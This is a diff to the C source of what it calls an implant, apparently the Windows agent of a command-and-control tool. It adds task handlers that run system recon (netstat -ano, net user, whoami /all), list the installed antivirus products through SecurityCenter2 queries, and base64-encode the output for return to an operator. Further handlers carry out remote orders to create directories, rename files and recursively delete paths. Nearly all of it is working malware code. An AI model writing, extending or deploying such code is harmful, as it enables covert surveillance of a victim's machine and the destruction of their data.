@@ -942,6 +942,68 @@ static BYTE *do_read_chunk(const char *path, long long offset, long long size,
     return buf;
 }
 
+/* mkdir -p (mirrors Go os.MkdirAll): create each component, ignore already-exists. */
+static int do_mkdir_all(const char *path) {
+    char buf[MAX_PATH * 2];
+    size_t i, n;
+    DWORD attr;
+    if (!path || !path[0]) return -1;
+    if (strlen(path) >= sizeof(buf) - 2) return -1;
+    strcpy_s(buf, sizeof(buf), path);
+    n = strlen(buf);
+    /* strip trailing slashes (but keep drive root like C:\) */
+    while (n > 1 && (buf[n-1] == '\\' || buf[n-1] == '/')) buf[--n] = '\0';
+    for (i = 1; buf[i]; i++) {
+        if (buf[i] == '\\' || buf[i] == '/') {
+            char save = buf[i];
+            buf[i] = '\0';
+            /* skip drive-letter prefix like "C:" */
+            if (!(i == 2 && buf[1] == ':')) {
+                if (!CreateDirectoryA(buf, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
+                    attr = GetFileAttributesA(buf);
+                    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) { buf[i] = save; return -1; }
+                }
+            }
+            buf[i] = save;
+        }
+    }
+    if (!CreateDirectoryA(buf, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
+        attr = GetFileAttributesA(buf);
+        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) return -1;
+    }
+    return 0;
+}
+
+/* Recursive delete (mirrors Go os.RemoveAll): files via DeleteFileA, dirs walked. */
+static int do_delete_recursive(const char *path) {
+    DWORD attr;
+    char pat[MAX_PATH * 2];
+    WIN32_FIND_DATAA fd;
+    HANDLE h;
+    if (!path || !path[0]) return -1;
+    attr = GetFileAttributesA(path);
+    if (attr == INVALID_FILE_ATTRIBUTES) return -1;
+    if (!(attr & FILE_ATTRIBUTE_DIRECTORY)) {
+        SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
+        return DeleteFileA(path) ? 0 : -1;
+    }
+    _snprintf(pat, sizeof(pat), "%s%s*", path,
+        (path[strlen(path)-1] == '\\' || path[strlen(path)-1] == '/') ? "" : "\\");
+    h = FindFirstFileA(pat, &fd);
+    if (h != INVALID_HANDLE_VALUE) {
+        do {
+            char child[MAX_PATH * 2];
+            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
+            _snprintf(child, sizeof(child), "%s%s%s", path,
+                (path[strlen(path)-1] == '\\' || path[strlen(path)-1] == '/') ? "" : "\\", fd.cFileName);
+            do_delete_recursive(child);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
+    SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
+    return RemoveDirectoryA(path) ? 0 : -1;
+}
+
 static const char *base_name(const char *p) {
     const char *b1 = strrchr(p, '\\');
     const char *b2 = strrchr(p, '/');
@@ -1741,7 +1803,60 @@ int main(void) {
                                                         free(raw);
                                                     }
                                                 }
-                                            } else {
+                                                                                        } else if (strcmp(t.type, "netstat") == 0 || strcmp(t.type, "users") == 0 || strcmp(t.type, "av") == 0) {
+                                                DWORD olen = 0;
+                                                char *out = NULL;
+                                                if (strcmp(t.type, "netstat") == 0) {
+                                                    out = exec_shell_full("netstat -ano", NULL, &olen);
+                                                } else if (strcmp(t.type, "users") == 0) {
+                                                    out = exec_shell_full("net user", NULL, &olen);
+                                                    if (!out || !out[0]) { if (out) free(out); out = exec_shell_full("whoami /all", NULL, &olen); }
+                                                } else {
+                                                    out = exec_shell_full("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | Format-List | Out-String", "powershell", &olen);
+                                                    if (!out || !out[0]) { if (out) free(out); out = exec_shell_full("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", NULL, &olen); }
+                                                }
+                                                if (out) {
+                                                    char *b64 = b64enc((const BYTE *)out, olen);
+                                                    robj = b64 ? emit_b64_result(t.id, t.type, b64, rid) : NULL;
+                                                    free(b64);
+                                                    free(out);
+                                                }
+                                                if (!robj) robj = emit_error_result(t.id, t.type, "recon failed", rid);
+                                            } else if (strcmp(t.type, "mkdir") == 0) {
+                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
+                                                if (!pp || !pp[0]) {
+                                                    robj = emit_error_result(t.id, "mkdir", "mkdir: directory path required", rid);
+                                                } else if (do_mkdir_all(pp) == 0) {
+                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "created directory %s", pp);
+                                                    robj = emit_text_result(t.id, "mkdir", msg, rid);
+                                                } else {
+                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "mkdir %s failed (%lu)", pp, GetLastError());
+                                                    robj = emit_error_result(t.id, "mkdir", msg, rid);
+                                                }
+                                            } else if (strcmp(t.type, "rename") == 0) {
+                                                const char *oldp = (t.command && t.command[0]) ? t.command : t.path;
+                                                const char *newp = (t.data && t.data[0]) ? t.data : t.shell;
+                                                if (!oldp || !oldp[0] || !newp || !newp[0]) {
+                                                    robj = emit_error_result(t.id, "rename", "rename: both current path (command) and new path (data) are required", rid);
+                                                } else if (MoveFileA(oldp, newp)) {
+                                                    char msg[2048]; _snprintf(msg, sizeof(msg), "renamed %s to %s", oldp, newp);
+                                                    robj = emit_text_result(t.id, "rename", msg, rid);
+                                                } else {
+                                                    char msg[2048]; _snprintf(msg, sizeof(msg), "rename %s -> %s failed (%lu)", oldp, newp, GetLastError());
+                                                    robj = emit_error_result(t.id, "rename", msg, rid);
+                                                }
+                                            } else if (strcmp(t.type, "delete") == 0) {
+                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
+                                                if (!pp || !pp[0]) {
+                                                    robj = emit_error_result(t.id, "delete", "path required", rid);
+                                                } else if (do_delete_recursive(pp) == 0) {
+                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "Deleted: %s", pp);
+                                                    robj = emit_text_result(t.id, "delete", msg, rid);
+                                                } else {
+                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "delete %s failed (%lu)", pp, GetLastError());
+                                                    robj = emit_error_result(t.id, "delete", msg, rid);
+                                                }
+} else {
                                                 char msg[128];
                                                 _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
                                                 robj = emit_error_result(t.id, t.type, msg, rid);
